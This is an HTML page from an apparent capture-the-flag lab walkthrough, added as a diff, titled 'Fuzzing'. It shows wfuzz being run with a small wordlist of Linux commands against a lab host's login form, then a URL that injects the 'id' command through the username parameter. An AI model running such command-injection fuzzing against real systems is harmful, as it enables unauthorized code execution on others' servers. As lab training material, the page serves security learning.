@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3.3 Fuzzing</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>3.3 Fuzzing</h1><br/><p></p><p>1. On your Kali Machine create a file called “commands.txt” with several Linux commands.</p><p>    <div class="codebox"><pre><span style="color:#a52a2a;font-weight:700">ls</span><br /><span style="color:#a52a2a;font-weight:700">date</span><br /><span style="color:#a52a2a;font-weight:700">id</span></pre></div></p><p></p><p>2. Try to find different Linux commands with “wfuzz”.</p><p>    <div class="codebox"><pre>$ wfuzz -c -w commands.txt -u <span style="color:#ff00ff;font-weight:400">&#39;http://log.discover.hmv/index.php?username=FUZZ&amp;password=1234&#39;</span> --hw 51</pre></div></p><p>	<span style="color:#ffa500;">Output:</span>   </p><p>    <img src="images/1009-1.png" alt="images/1009-1.png" /></p><p>    </p><p>    The web is vulnerable to command execution.</p><p>    </p><p>3. Try some command.</p><p>    Visit <a href="http://log.discover.hmv/index.php?username=id&password=1234">http://log.discover.hmv/index.php?username=id&amp;password=1234</a>.</p><p>    </p><p>    <img src="images/1009-2.png" alt="images/1009-2.png" /></p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
+</body>
+</html>
